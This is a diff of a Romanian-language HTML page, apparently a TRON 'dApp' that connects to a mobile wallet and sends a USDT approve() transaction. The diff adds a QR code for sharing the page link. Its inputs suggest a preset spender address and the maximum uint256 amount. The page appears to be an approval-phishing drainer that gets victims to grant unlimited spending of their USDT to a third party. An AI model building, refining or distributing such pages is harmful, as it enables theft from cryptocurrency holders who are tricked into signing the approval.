@@ -3,31 +3,45 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>TRON PRO dApp</title>
+<title>TRON PRO QR dApp</title>
 
 <style>
 body{font-family:system-ui;margin:20px;background:#f7f9fc}
 .card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px}
 input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
 button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
-.secondary{background:#e5e7eb;color:#111}
 pre{background:#f3f4f6;padding:10px;border-radius:8px}
 .status{padding:6px 10px;border-radius:999px;background:#fee2e2;display:inline-block}
 .ok{background:#d1fae5}
+canvas{margin-top:10px}
 </style>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
 </head>
 
 <body>
 
 <div class="card">
-<h2>TRON PRO dApp</h2>
+<h2>TRON PRO QR dApp</h2>
+
 <div id="status" class="status">Deconectat</div>
 <p>Wallet: <b id="addr">—</b></p>
+
 <button onclick="connect()">Connect Wallet</button>
 </div>
 
 <div class="card">
-<h3>TRC20 Settings</h3>
+<h3>QR dApp Link</h3>
+
+<button onclick="generateQR()">Generează QR</button>
+<canvas id="qr"></canvas>
+
+<p id="link"></p>
+</div>
+
+<div class="card">
+<h3>TRC20 Approve</h3>
 
 <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
 <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
@@ -41,62 +55,54 @@ pre{background:#f3f4f6;padding:10px;border-radius:8px}
 const USDT="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
 let addr=null;
 
+// LINK-ul tău dApp (IMPORTANT)
+const DAPP_URL = window.location.href;
+
+function generateQR(){
+QRCode.toCanvas(document.getElementById('qr'), DAPP_URL, function (error) {
+if (error) console.error(error);
+});
+
+document.getElementById("link").innerText = DAPP_URL;
+}
+
 function connect(){
-  if(!window.tronWeb || !window.tronWeb.defaultAddress.base58){
-    alert("Deschide în Trust Wallet / TronLink dApp browser");
-    return;
-  }
-  addr = window.tronWeb.defaultAddress.base58;
-  document.getElementById("addr").innerText = addr;
-  document.getElementById("status").innerText = "Conectat";
-  document.getElementById("status").classList.add("ok");
+if(!window.tronWeb || !window.tronWeb.defaultAddress.base58){
+alert("Deschide în Trust Wallet dApp browser");
+return;
+}
+addr = window.tronWeb.defaultAddress.base58;
+
+document.getElementById("addr").innerText = addr;
+document.getElementById("status").innerText = "Conectat";
+document.getElementById("status").classList.add("ok");
 }
 
 async function getContract(){
-  return await window.tronWeb.contract().at(USDT);
-}
-
-function toUnits(amount){
-  amount = amount.replace(",", ".").trim();
-
-  // max support
-  if(amount.toLowerCase() === "max"){
-    return (BigInt(1) << BigInt(256)) - BigInt(1);
-  }
-
-  if(/^[0-9]+$/.test(amount)){
-    return BigInt(amount) * 1000000n;
-  }
-
-  const parts = amount.split(".");
-  const intPart = parts[0] || "0";
-  const frac = (parts[1] || "").padEnd(6, "0").slice(0,6);
-
-  return BigInt(intPart + frac);
+return await window.tronWeb.contract().at(USDT);
 }
 
 async function approve(){
-  try{
-    const spender = document.getElementById("spender").value;
-    const amount = document.getElementById("amount").value;
+try{
+const spender=document.getElementById("spender").value;
+const amount=document.getElementById("amount").value;
 
-    if(!spender || !amount){
-      document.getElementById("out").innerText="Completează câmpurile";
-      return;
-    }
+if(!spender || !amount){
+document.getElementById("out").innerText="Completează câmpurile";
+return;
+}
 
-    const value = toUnits(amount);
+const value = BigInt(Math.floor(Number(amount) * 1e6));
 
-    const c = await getContract();
-    const tx = await c.approve(spender, value.toString()).send();
+const c = await getContract();
+const tx = await c.approve(spender,value.toString()).send();
 
-    document.getElementById("out").innerText =
-      "Approve sent!\nTX: " + tx;
+document.getElementById("out").innerText =
+"Approve TX:\n" + tx;
 
-  }catch(e){
-    document.getElementById("out").innerText =
-      "Eroare approve / user rejected";
-  }
+}catch(e){
+document.getElementById("out").innerText="Eroare / user a refuzat";
+}
 }
 </script>
 
